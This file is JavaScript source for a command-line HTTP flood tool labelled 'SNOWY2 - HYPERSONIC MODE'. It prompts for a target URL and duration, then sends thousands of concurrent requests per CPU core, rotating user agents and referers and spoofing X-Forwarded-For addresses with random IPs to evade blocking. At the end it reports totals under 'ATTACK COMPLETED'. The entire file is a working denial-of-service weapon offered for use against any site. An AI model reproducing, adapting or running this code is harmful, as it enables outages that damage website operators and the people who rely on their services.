const axios = require('axios');
const fs = require('fs');
const os = require('os');
const process = require('process');

const FIXED_CONCURRENCY = 3000; // Increased concurrency
const REQUEST_TIMEOUT = 8000; // Reduced timeout
const THREAD_COUNT = os.cpus().length; // Dynamically set based on available cores

const REFERERS = loadLines('refs.txt');
const USER_AGENTS = loadLines('ua.txt');

function loadLines(file) {
    try {
        return fs.readFileSync(file, 'utf8')
            .split('\n')
            .map(l => l.trim())
            .filter(Boolean);
    } catch {
        return [];
    }
}

function randItem(arr, fallback = '') {
    return arr[Math.floor(Math.random() * arr.length)] || fallback;
}

function randIp() {
    return Array(4).fill(0).map(() => Math.floor(Math.random() * 255)).join('.');
}

class AttackEngine {
    constructor(target, duration) {
        this.target = target;
        this.duration = duration * 1000;
        this.startTime = Date.now();
        this.stats = { total: 0, success: 0, errors: 0, peakRps: 0 };
    }

    async fireRequest() {
        const headers = {
            'User-Agent': randItem(USER_AGENTS, 'Mozilla/5.0'),
            'Referer': randItem(REFERERS, 'https://google.com'),
            'X-Forwarded-For': randIp()
        };

        try {
            await axios.get(this.target, {
                headers,
                timeout: REQUEST_TIMEOUT,
                maxRedirects: 0,
                validateStatus: null,
                decompress: false
            });
            return true;
        } catch {
            return false;
        }
    }

    async boosterThread() {
        while (Date.now() - this.startTime < this.duration) {
            const results = await Promise.allSettled(
                Array.from({ length: FIXED_CONCURRENCY }, () => this.fireRequest())
            );
            results.forEach(res => {
                this.stats.total++;
                if (res.status === 'fulfilled' && res.value) {
                    this.stats.success++;
                } else {
                    this.stats.errors++;
                }
            });
        }
    }

    async run() {
        console.log(`\nSNOWY2 - HYPERSONIC MODE`);
        console.log('='.repeat(60));
        console.log(`TARGET: ${this.target}`);
        console.log(`DURATION: ${this.duration / 1000}s`);
        console.log('='.repeat(60));

        const statTicker = setInterval(() => this.displayStats(), 100);
        const boosters = Array.from({ length: THREAD_COUNT }, () => this.boosterThread());

        while (Date.now() - this.startTime < this.duration) {
            await Promise.allSettled(boosters);
        }

        clearInterval(statTicker);
        this.printResults();
    }

    displayStats() {
        const elapsed = (Date.now() - this.startTime) / 1000;
        const rps = (this.stats.total / elapsed).toFixed(1);
        this.stats.peakRps = Math.max(this.stats.peakRps, parseFloat(rps));
        process.stdout.write(`\r🔥 RPS: ${rps} | HIT: ${this.stats.success} | ERR: ${this.stats.errors} | TOTAL: ${this.stats.total} | TIME: ${elapsed.toFixed(1)}s`);
    }

    printResults() {
        const elapsed = (Date.now() - this.startTime) / 1000;
        const avgRps = (this.stats.total / elapsed).toFixed(1);
        console.log('\n\nATTACK COMPLETED');
        console.log('='.repeat(60));
        console.log(`TOTAL REQUESTS: ${this.stats.total}`);
        console.log(`SUCCESS (200): ${this.stats.success}`);
        console.log(`ERRORS: ${this.stats.errors}`);
        console.log(`AVERAGE RPS: ${avgRps}`);
        console.log(`PEAK RPS: ${this.stats.peakRps.toFixed(1)}`);
        console.log('='.repeat(60));
    }
}

// Main execution
(async () => {
    const readline = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });

    const ask = q => new Promise(res => readline.question(q, res));
    let target = await ask("TARGET: ");
    if (!target.startsWith("http")) target = "http://" + target;
    const time = parseInt(await ask("TIME (seconds): "));
    readline.close();

    if (isNaN(time)) return console.log("Invalid time.");

    const engine = new AttackEngine(target.trim(), time);
    await engine.run();
})();
